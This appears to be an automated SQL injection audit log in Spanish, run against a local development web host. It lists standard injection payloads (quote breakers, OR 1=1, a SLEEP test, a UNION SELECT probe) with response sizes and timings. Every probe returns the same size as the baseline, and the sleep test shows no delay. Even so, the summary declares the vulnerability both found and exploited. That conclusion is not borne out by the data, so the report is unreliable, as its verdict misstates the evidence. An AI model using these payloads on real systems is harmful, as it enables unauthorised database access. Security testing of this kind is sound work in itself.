# Informe de auditoría SQL Injection
Objetivo: http://web.dev.local:8083
Fecha: 2026-04-13T08:25:28 (UTC)

-- Descargando página principal --
Tamaño de respuesta: 2576 /tmp/sqli_home.html
\n-- Enlaces con parámetros encontrados --
(ninguno encontrado)
\n-- Formularios (fragmentos) --
Linea: 81:            <form action="#" method="GET">
\n-- Pruebas de inyección sobre parámetro 'id' (GET) --
Baseline size: 2576 bytes, time: 0.008140 s
Payload: 1' | size: 2576 | time: 0.002448
Payload: 1'-- | size: 2576 | time: 0.003224
Payload: 1' OR '1'='1 | size: 2576 | time: 0.002595
Payload: 1) OR (1=1 | size: 2576 | time: 0.003367
Payload: 1" | size: 2576 | time: 0.003648
\n-- Prueba time-based (SLEEP) --
Sleep payload time: 0.010484 s (baseline 0.008140 s)
\n-- Prueba UNION SELECT reflectiva (1..6 columnas) --
Cols: 1 | size: 2576
  -> Reflexión detectada de valores (encontrados: 1 de 1)
\n-- Resumen --
VULN_FOUND: true
VULN_EXPLOITED: true
